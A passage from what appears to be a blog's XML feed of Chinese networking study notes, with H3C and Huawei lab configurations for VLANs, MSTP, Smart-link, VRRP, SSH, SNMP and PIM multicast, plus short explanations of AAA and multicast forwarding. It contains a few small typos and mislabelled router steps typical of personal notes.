class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">vlan 10 </span><br><span class="line">vlan 20</span><br><span class="line">vlan 100</span><br><span class="line">vlan 200</span><br><span class="line">int g 1/0/1</span><br><span class="line">port link-type trunk</span><br><span class="line">port tr per vlan 10 20 100 200</span><br><span class="line">int g 1/0/2</span><br><span class="line">port link-type trunk</span><br><span class="line">port tr per vlan 10 20 100 200</span><br><span class="line">int g 1/0/3</span><br><span class="line">port link-type trunk</span><br><span class="line">port tr per vlan 10 20 100 200</span><br></pre></td></tr></table></figure><p><strong>III</strong>.SW1 和 SW2 之间的直连链路上配置静态链路聚合实现链路冗余，并提高链路带宽</p><p>略</p><p><strong>IV</strong>.SW3 为某接入点二层交换机，与汇聚交换机 SW1 和 SW2 运行 MSTP 来对 Vlan10 和 Vlan20 的流量进行负载分担。要求 Vlan10 的流量优先从 SW1 转发，Vlan20 的流量优先从 SW2 转发。当链路故障，SW1 和 SW2 互为备份</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">SW3\SW1\SW2：</span><br><span class="line">stp region-configuration</span><br><span class="line"> region-name h3c</span><br><span class="line"> revision-level 1</span><br><span class="line"> instance 1 vlan 10 </span><br><span class="line"> instance 2 vlan 20 </span><br><span class="line"> active region-configuration</span><br><span class="line"> </span><br><span class="line"> SW1:</span><br><span class="line">[SW1]stp instance 1 root primary </span><br><span class="line">[SW1]stp instance 2 root secondary </span><br><span class="line"> SW2:</span><br><span class="line">[SW2]stp instance 1 root secondary </span><br><span class="line">[SW2]stp instance 2 root primary </span><br></pre></td></tr></table></figure><p><img src="/images/%E5%9B%AD%E5%8C%BA%E7%BD%91%E7%BB%BC%E5%90%88%E5%AE%9E%E9%AA%8C/02.jpg"></p><p><strong>V</strong>.SW4 为另一接入点二层交换机，使用 Smart-link 对上行链路进行备份。要求 Smart-link 组 1 引用 MST 实例 1 （映射 Vlan10）的流量经过 SW1 的链路访问上行设备，而 Smart-link 组 2 引用实例 2（映射 Vlan20）的流量经过 SW2 的链路访问上行设备，组 1 和组 2 分别在 Vlan100 和 Vlan200 内发送和接收 Flush 报文。要求当 Smart-link 主链路故障恢复后，端口角色能够自动恢复</p><p>SW4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[SW4]int g 1/0/1</span><br><span class="line">[SW4-GigabitEthernet1/0/1]undo stp en</span><br><span class="line">[SW4-GigabitEthernet1/0/1]int g 1/0/2</span><br><span class="line">[SW4-GigabitEthernet1/0/2]undo stp en</span><br><span class="line">[SW4-smlk-group1]stp reg</span><br><span class="line">[SW4-mst-region]instance 1 vlan 100</span><br><span class="line">[SW4-mst-region]instance 2 vlan 200</span><br><span class="line">[SW4-mst-region]act reg</span><br><span class="line">[SW4-GigabitEthernet1/0/2]smart-link group 1</span><br><span class="line">[SW4-smlk-group1]protected-vlan reference-instance 0 to 1</span><br><span class="line">[SW4-smlk-group1]flush enable control-vlan 100</span><br><span class="line">[SW4-smlk-group1]port g 1/0/1 primary </span><br><span class="line">[SW4-smlk-group1]port g 1/0/2 secondary </span><br><span class="line">[SW4-smlk-group1]preemption mode role </span><br><span class="line">[SW4-smlk-group1]smart-link g 2</span><br><span class="line">[SW4-smlk-group2]protected-vlan reference-instance 2</span><br><span class="line">[SW4-smlk-group2]flush enable control-vlan 200</span><br><span class="line">[SW4-smlk-group2]port g 1/0/2 primary </span><br><span class="line">[SW4-smlk-group2]port g 1/0/1 secondary </span><br><span class="line">[SW4-smlk-group2]preemption mode role </span><br></pre></td></tr></table></figure><p>SW1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1]int g 1/0/4</span><br><span class="line">[SW1-GigabitEthernet1/0/4]undo stp en</span><br><span class="line">[SW1-GigabitEthernet1/0/4]smart-link flush enable control-vlan 100 200</span><br><span class="line">[SW1-GigabitEthernet1/0/4]int b  1</span><br><span class="line">[SW1-Bridge-Aggregation1]smart-link flush enable control-vlan 100 200</span><br><span class="line">[SW1-Bridge-Aggregation1]int g 1/0/3</span><br><span class="line">[SW1-GigabitEthernet1/0/3]smart-link flush enable control-vlan 100 200</span><br></pre></td></tr></table></figure><p>SW2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW2-GigabitEthernet1/0/3] int g 1/0/4</span><br><span class="line">[SW2-GigabitEthernet1/0/4]undo stp en</span><br><span class="line">[SW2-GigabitEthernet1/0/4]smart-link flush enable control-vlan 100 200</span><br><span class="line">[SW2-GigabitEthernet1/0/4]int b 1</span><br><span class="line">[SW2-Bridge-Aggregation1]smart-link flush enable control-vlan 100 200</span><br><span class="line">[SW2-Bridge-Aggregation1]int g 1/0/3</span><br><span class="line">[SW2-GigabitEthernet1/0/3]smart-link flush enable control-vlan 100 200</span><br><span class="line">[SW2-GigabitEthernet1/0/3]</span><br></pre></td></tr></table></figure><p><strong>VI</strong>.SW1 和 SW2 作为汇聚层网关，运行 VRRP，Vlan10 使用 SW1 作为 VRRP 的主网关，Vlan20 使用 SW2 作为 VRRP 的主网关。</p><p>SW1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[SW1-GigabitEthernet1/0/3]int vlan 10</span><br><span class="line">[SW1-Vlan-interface10]ip add 192.168.1.252 24</span><br><span class="line">[SW1-Vlan-interface10]vrrp vrid 10 virtual-ip 192.168.1.254</span><br><span class="line">[SW1-Vlan-interface10]vrrp vrid 10 pr 120</span><br><span class="line">[SW1-Vlan-interface10]int vlan 20</span><br><span class="line">[SW1-Vlan-interface20]ip add 192.168.2.252 24</span><br><span class="line">[SW1-Vlan-interface20]vrrp vrid 20 vir 192.168.2.254</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[SW1-Vlan-interface20]dis vrrp</span><br><span class="line">IPv4 virtual router information:  </span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 2</span><br><span class="line"> Interface          VRID  State       Running Adver     Auth     Virtual</span><br><span class="line">                                      pri     timer(cs) type     IP</span><br><span class="line"> ---------------------------------------------------------------------</span><br><span class="line"> Vlan10             10    Master      120     100       None     192.168.1.254   </span><br><span class="line"> Vlan20             20    Backup      100     100       None     192.168.2.254 </span><br></pre></td></tr></table></figure><p>SW2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW2-Vlan-interface10]ip add 192.168.1.253 24</span><br><span class="line">[SW2-Vlan-interface10]vrrp vrid 10 virtual-ip 192.168.1.254</span><br><span class="line">[SW2-Vlan-interface10]int vlan 20</span><br><span class="line">[SW2-Vlan-interface20]ip add 192.168.2.253 24</span><br><span class="line">[SW2-Vlan-interface20]vrrp vrid 20 vir 192.168.2.254</span><br><span class="line">[SW2-Vlan-interface20]vrrp vrid 20 priority 120</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[SW2-Vlan-interface20]dis vrrp</span><br><span class="line">IPv4 virtual router information:  </span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 2</span><br><span class="line"> Interface          VRID  State       Running Adver     Auth     Virtual</span><br><span class="line">                                      pri     timer(cs) type     IP</span><br><span class="line"> ---------------------------------------------------------------------</span><br><span class="line"> Vlan10             10    Backup      100     100       None     192.168.1.254   </span><br><span class="line"> Vlan20             20    Master      120     100       None     192.168.2.254</span><br></pre></td></tr></table></figure><p><strong>VII</strong>.要求终端 PC 接入网络后，能够立即转发数据。当连接 PC 的端口收到 BPDU 后立即关闭</p><p>SW3&#x2F;SW4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW3]int g 1/0/3</span><br><span class="line">[SW3-GigabitEthernet1/0/3]stp edged-port </span><br><span class="line">[SW3]stp bpdu-protection </span><br></pre></td></tr></table></figure><p><strong>VIII</strong>.在 SW1 上配置 SSH 服务，要求只有 Vlan10 能够远程登录 SW1，登录用户名和密码都为 <code>runtime</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[SW1]acl basic 2000</span><br><span class="line">[SW1-acl-ipv4-basic-2000]rule per source 192.168.1.0 0.0.0.255</span><br><span class="line">[SW1]ssh ser en</span><br><span class="line">[SW1]user-int vty 0 4</span><br><span class="line">[SW1-line-vty0-4]authentication-mode scheme </span><br><span class="line">[SW1-line-vty0-4]protocol inbound ssh</span><br><span class="line">[SW1-line-vty0-4]local-user runtime</span><br><span class="line">New local user added.</span><br><span class="line">[SW1-luser-manage-runtime]pass sim runtime</span><br><span class="line">[SW1-luser-manage-runtime]service-type ssh</span><br><span class="line">[SW1-luser-manage-runtime]authorization-attribute user-role level-15</span><br><span class="line">[SW1-luser-manage-runtime]qu</span><br><span class="line">[SW1]ssh service acl 2000</span><br></pre></td></tr></table></figure><p><strong>IX</strong>.在 SW2 上配置 SNMP，要求只有 PC6 能够使用 SNMP 管理 SW2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW1-acl-ipv4-basic-2001]rule permit source 192.168.2.1 0.0.0.0</span><br><span class="line">[SW1-acl-ipv4-basic-2001]qu</span><br><span class="line">[SW1]snmp-agent sys-info version all</span><br><span class="line">[SW1]snmp-agent community read 123456 acl 2001</span><br><span class="line">[SW1]snmp-agent community write 654321 acl 2001</span><br><span class="line">[SW1]snmp-agent target-host trap address udp-domain 192.168.2.1 params securityn</span><br><span class="line">ame 123456</span><br><span class="line">[SW1]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/posts/55244"/>
      <url>/posts/55244</url>
      
        <content type="html"><![CDATA[<br /><br /><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li>一种安全的远程登录协议</li><li>基于TCP22端口传输</li></ul><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><ul><li>支持数据加密和数字签名</li></ul><h3 id="连接建立流程"><a href="#连接建立流程" class="headerlink" title="连接建立流程"></a>连接建立流程</h3><p><img src="/images/SSH/01.jpg"></p><br /><h2 id="SSH实验"><a href="#SSH实验" class="headerlink" title="SSH实验"></a>SSH实验</h2><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><hr><p><img src="/images/SSH/02.jpg"></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.按照图示配置 IP 地址，使用真机连接模拟器 R1</p><p><strong>II</strong>.在 R1 上配置 SSH 服务，使真机可以使用 SSH 远程登录 R1</p><p><strong>III</strong>.公钥加密连接</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p><strong>I</strong>.<strong>配置 IP 地址部分略</strong></p><p><strong>II</strong>.<strong>在 R1 上配置 SSH 服务，使真机可以使用 SSH 远程登录 R1</strong></p><p><em>步骤 1：开启 SSH 服务</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[R1]ssh server enable</span><br></pre></td></tr></table></figure><p><em>步骤 2：进入 VTY 视图，配置验证模式为 scheme，设置用户权限为 Level-15，并配置协议为 ssh</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R1]user-interface vty 0 4</span><br><span class="line">[R1-line-vty0-4]authentication-mode scheme</span><br><span class="line">[R1-line-vty0-4]user-role level-15 </span><br><span class="line">[R1-line-vty0-4]protocol inbound ssh</span><br></pre></td></tr></table></figure><p><em>步骤 3：创建用于登录验证的用户，配置密码，配置用户权限为 Level-15，服务类型为 ssh</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[R1]local-user zhangdaye class manage </span><br><span class="line">New local user added.</span><br><span class="line">[R1-luser-manage-wangdaye]password simple 123456789.</span><br><span class="line">[R1-luser-manage-wangdaye]service-type ssh</span><br><span class="line">[R1-luser-manage-wangdaye]authorization-attribute user-role level-15</span><br></pre></td></tr></table></figure><p><strong>III.公钥加密连接</strong></p><p><em>步骤 1：在 R1 上创建 RSA 密钥</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[R1]public-key local create rsa </span><br><span class="line">The range of public key modulus is (512 ~ 2048). </span><br><span class="line">If the key modulus is greater than 512, it will take a few minutes.</span><br><span class="line">Press CTRL+C to abort.</span><br><span class="line">Input the modulus length [default = 2048]:</span><br><span class="line">Generating Keys...</span><br><span class="line">..</span><br><span class="line">Create the key pair successfully.</span><br></pre></td></tr></table></figure><p><em>步骤 2：在SecureCRT工具中创建公钥文件</em></p><p><img src="/images/SSH/03.jpg"></p><p><em>步骤4：将创建好的文件移动到R1中步骤略</em></p><p>R1开启ftp功能，HOST将公钥文件移动到R1</p><p><em>步骤5：导入密钥并绑定用户结果见图2-2、2-3</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[R1]public-key peer zdy import sshkey flash:/Identity.pub</span><br><span class="line">[R1]ssh user zhangdaye service-type stelnet authentication-type publickey assign</span><br><span class="line"> publickey zdy</span><br></pre></td></tr></table></figure><p><img src="/images/SSH/04.jpg"></p><p><img src="/images/SSH/05.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AAA</title>
      <link href="/posts/74a0"/>
      <url>/posts/74a0</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="AAA架构"><a href="#AAA架构" class="headerlink" title="AAA架构"></a>AAA架构</h3><ul><li><p>Authentication<strong>用户验证</strong>：确认访问网络的远程用户的身份，判断访问者是否为合法的网络用户。</p></li><li><p>Authorization<strong>授权</strong>：对不同用户赋予不同的权限，限制用户可以使用的服务。例如用户成功登录服务器后，管理员可以授权用户对服务器中的文件进行访问和打印操作。</p></li><li><p>Accounting<strong>计费</strong>：记录用户使用网络服务中的所有操作，包括使用的服务类型、起始时间、数据流量等；</p></li></ul><h3 id="验证模式"><a href="#验证模式" class="headerlink" title="验证模式"></a>验证模式</h3><ul><li>本地验证<code>用户身份验证过程发生在接入设备上</code></li><li>远程验证     <ul><li><code>用户身份验证过程发生在指定的AAA服务器上</code></li><li><code>可以实现对网络中所有接入点进行集中统一身份验证</code></li></ul></li></ul><h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><p>RADIUS</p><ul><li><code>使用UDP1812和1813端口传输数据</code></li><li><code>验证和授权发生在同一台服务器上，不可分离</code></li></ul><p>TACACS+</p><ul><li><code>使用TCP传输</code></li><li><code>比RADIUS的安全级别更高</code><ul><li><code>Radius只对报文头部加密</code></li><li><code>TACACS+对报文zhen</code></li></ul></li><li><code>TACACS+可以对用户命令行的级别进行授权，而Radius不行</code></li><li><code>验证、授权、计费可独立运行在不同服务器上</code></li></ul><p></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组播实验</title>
      <link href="/posts/298"/>
      <url>/posts/298</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/%E7%BB%84%E6%92%AD%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p>I.按照图示配置 IP 地址</p><p>II.配置 OSPF 实现单播路由互通</p><p>III.配置 PIM-SM 实现组播路由互通，C-BSR 和 C-RP 为 R2 的 Loopback0 口</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>I.<strong>配置 IP 地址部分略</strong></p><p>II.<strong>配置 OSPF 部分略</strong></p><p>III.<strong>配置 PIM-SM 实现组播路由互通，C-BSR 和 C-RP 为 R2 的 Loopback0 口</strong></p><p><em>步骤 1：在 R1 上开启组播应用，配置 PIM，并在 G0&#x2F;0，G0&#x2F;1 口开启 PIM-SM 模式</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HUAWEI：</span><br><span class="line">[R1]muticast routing-enable</span><br><span class="line">[R1]pim</span><br><span class="line">[R1-G 0/0/0]pim sm</span><br><span class="line">[R1-G 0/0/1]pim sm</span><br><span class="line">[R1-G 0/0/2]pim sm</span><br><span class="line">H3C：</span><br><span class="line">[R1]muticast routing</span><br><span class="line">[R1]pim</span><br><span class="line">[R1-GigabitEthernet0/0]pim sm</span><br><span class="line">[R1-GigabitEthernet0/1]pim sm</span><br><span class="line">[R1-GigabitEthernet0/2]pim sm</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 R3上开启组播应用，配置 PIM，并在 G0&#x2F;0&#x2F;0，G0&#x2F;0&#x2F;2，Loopback0 口开启 PIM-SM 模式，配置 C-BSR 和 C-RP 为 <code>3.3.3.3</code>，由于 R3连接了组播接收者，所以需要在 G0&#x2F;0&#x2F;1 口使能 IGMP</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">HUAWEI：</span><br><span class="line">[R2]muticast routing-enable</span><br><span class="line">[R2]pim</span><br><span class="line">[R2-pim]c-bsr loopback0</span><br><span class="line">[R2-pim]c-rp loopback0</span><br><span class="line">[R2-G 0/0/0]pim sm</span><br><span class="line">[R2-G 0/0/2]pim sm</span><br><span class="line">[R2-Loopback0]pim sm</span><br><span class="line">[R2-G0/0/1]igmp enable</span><br><span class="line">H3C:</span><br><span class="line">[R2]muticast routing</span><br><span class="line">[R2]pim</span><br><span class="line">[R2-pim]c-bsr 2.2.2.2</span><br><span class="line">[R2-pim]c-rp 2.2.2.2</span><br><span class="line">[R2-GigabitEthernet0/0]pim sm</span><br><span class="line">[R2-GigabitEthernet0/1]pim sm</span><br><span class="line">[R2-Loopback0]pim sm</span><br><span class="line">[R2-GigabitEthernet0/2]igmp enable</span><br></pre></td></tr></table></figure><p><em>步骤 3：在 R2 上开启组播应用，配置 PIM，并在 G0&#x2F;0，G0&#x2F;1 口开启 PIM-SM 模式</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HUAWEI：</span><br><span class="line">[R3]muticast routing-enable</span><br><span class="line">[R3]pim</span><br><span class="line">[R3 G0/0/0]pim sm</span><br><span class="line">[R3 G0/0/1]pim sm</span><br><span class="line">H3C:</span><br><span class="line">[R3]muticast routing</span><br><span class="line">[R3]pim</span><br><span class="line">[R3-GigabitEthernet0/0]pim sm</span><br><span class="line">[R3-GigabitEthernet0/1]pim sm</span><br></pre></td></tr></table></figure><p><em>步骤 4：在 R4 上开启组播应用，配置 PIM，并在 G0&#x2F;0，G0&#x2F;1，Loopback0 口开启 PIM-SM 模式，由于 R2 连接了组播接收者，所以需要在 G0&#x2F;0&#x2F;1 口使能 IGMP</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HUAWEI：</span><br><span class="line">[R2]muticast routing-enable</span><br><span class="line">[R2]pim</span><br><span class="line">[R2 G 0/0/0]pim sm</span><br><span class="line">[R2 G 0/0/2]pim sm</span><br><span class="line">[R2 Loopback0]pim sm</span><br><span class="line">[R2 G 0/0/1]igmp enable</span><br><span class="line">H3C:</span><br><span class="line">[R2]muticast routing</span><br><span class="line">[R2]pim</span><br><span class="line">[R2-GigabitEthernet0/0]pim sm</span><br><span class="line">[R2-GigabitEthernet0/1]pim sm</span><br><span class="line">[R2-Loopback0]pim sm</span><br><span class="line">[R2-GigabitEthernet0/2]igmp enable</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组播路由协议</title>
      <link href="/posts/37555"/>
      <url>/posts/37555</url>
      
        <content type="html"><![CDATA[<br /><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>用于建立和维护组播路由</p><h3 id="常见组播路由协议"><a href="#常见组播路由协议" class="headerlink" title="常见组播路由协议"></a>常见组播路由协议</h3><p><em>DVMRP</em></p><ul><li>RIP组播报文</li><li>要求单播使用RIP</li></ul><p><em>MOSPT</em></p><ul><li>OSPF组播版本</li><li>要求单播使用OSPFv2</li></ul><p><em>PIM</em></p><ul><li>协议无关组播</li><li>对单播路由来源无要求</li></ul><h3 id="PIM-DM"><a href="#PIM-DM" class="headerlink" title="PIM-DM"></a>PIM-DM</h3><p><em>定义</em></p><ul><li>RIM密集模式</li><li>假定网络中组播接收者较多，且分部于大部分设备上，采用推的方式分发组播数据</li><li>适用于小规模组播网络</li></ul><p><em>邻居发现机制</em></p><ul><li>PIM路由器之间周期性发送Hello报文来发现，建立和维护邻居关系</li><li>如网段中IGMP版本是v1，则Hello报文可以选举查询器</li></ul><p><em>运行机制</em></p><p><img src="/images/%E7%BB%84%E6%92%AD%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/01.png"></p><h3 id="PIM-SM"><a href="#PIM-SM" class="headerlink" title="PIM-SM"></a>PIM-SM</h3><p><em>定义</em></p><ul><li>PIM稀疏模式适用于任何规模的网络</li><li>采取拉的方式，根据接收者的需求，在组播接收者和组播源之间建立组播分发树</li><li>无论网段中的IGMP版本是什么版本，都通过Hello报文选举查询器</li></ul><p><em>邻居发现机制</em></p><ul><li>PIM路由器之间周期性发送Hello报文来发现，建立和维护邻居关系</li><li>如网段中IGMP版本是v1，则Hello报文可以选举查询器</li></ul><p><em>运行机制</em></p><p><img src="/images/%E7%BB%84%E6%92%AD%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/2.png"></p><h3 id="PIM-SSM"><a href="#PIM-SSM" class="headerlink" title="PIM-SSM"></a>PIM-SSM</h3><ul><li>组播接收者通过IGMPv3感知到组播源地址</li><li>接收者一侧DR向组播源发起Join报文，建立SPT</li></ul><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[h3c]multicast routing#全局开启组播路由功能</span><br><span class="line">[h3c]pim     #创建PIM进程</span><br><span class="line">[h3c-GigabitEthernet0/0]pim  &#x27;dm/sm&#x27;        #接口使能PIM,并指定PIM模式</span><br><span class="line">[h3c-pim]static-rp &#x27;ip-address&#x27;   #配置静态RP</span><br><span class="line">[h3c-pim]c-rp &#x27;ip-address&#x27;     #配置候选RP</span><br><span class="line">[h3c-pim]c-bsr &#x27;ip-address&#x27;     #配置候选BSR</span><br><span class="line">[h3c]display multicast routing-table    #查看组播路由表</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组播转发机制</title>
      <link href="/posts/3426"/>
      <url>/posts/3426</url>
      
        <content type="html"><![CDATA[<br /><h3 id="组播分发树"><a href="#组播分发树" class="headerlink" title="组播分发树"></a>组播分发树</h3><p><em>定义</em></p><ul><li>组播数据在网络中的转发路径</li><li>由组播路由器协议建立</li></ul><p><em>分类</em></p><p><strong>SPT</strong></p><ul><li>最短路径树</li><li>为每个组播源分别建立一条到达接收者的最短路径</li><li>可保证组播转发低延迟</li><li>需要维护的路径数量太多</li></ul><p><strong>RPT</strong></p><ul><li>共享树</li><li>建立一条所有组播源到所有接收者的共享路径</li><li>只需要维护少量的组播路径</li><li>无法保证每个组播源到接收者是最优路径</li></ul><h3 id="RPF机制"><a href="#RPF机制" class="headerlink" title="RPF机制"></a>RPF机制</h3><p><em>定义</em>    逆向路径转发</p><p><em>工作机制</em></p><ul><li>组播数据包到达路由器后，执行RPF检查</li><li>如果数据包是在到达组播源的最优路径上到达，则RPF检查成功，数据被转发</li><li>如果RPF检查失败，则丢弃数据包</li><li>RPF检查基于单播路由器</li></ul>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IGMP</title>
      <link href="/posts/9619"/>
      <url>/posts/9619</url>
      
